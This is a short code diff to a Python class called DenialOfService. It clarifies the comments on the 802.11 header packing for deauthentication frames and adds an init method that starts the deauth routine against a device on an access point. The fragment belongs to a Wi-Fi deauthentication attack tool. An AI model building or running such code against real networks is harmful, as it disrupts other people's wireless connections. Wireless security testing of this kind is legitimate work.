@@ -80,8 +80,9 @@ class DenialOfService():
         # construct nearly empty packet:
         #   big-endian (for network)
         #   radio tap header: 2B empty, 2B length, 4B empty
-        #   802.11 header: 2B control, 2B empty
-        #                  6B addr1, 6B addr2, 6B addr3, 4B empty
+        #   802.11 header: 2B control, 2B empty (duration)
+        #                  6B addr1, 6B addr2, 6B addr3
+        #                  4B empty (sequence control + ht control)
         packet = struct.pack(
             '!2x2s4x2s2x6s6s6s4x',
             length,
@@ -103,6 +104,10 @@ class DenialOfService():
                       f'to {target_addr} on AP {access_point}')
             else:
                 time.sleep(1)
+
+    def init(self, device, ap):
+        self.running = True
+        self.deauth(device, ap)
 
     def init_deauth(self, device, ap):
         def _():
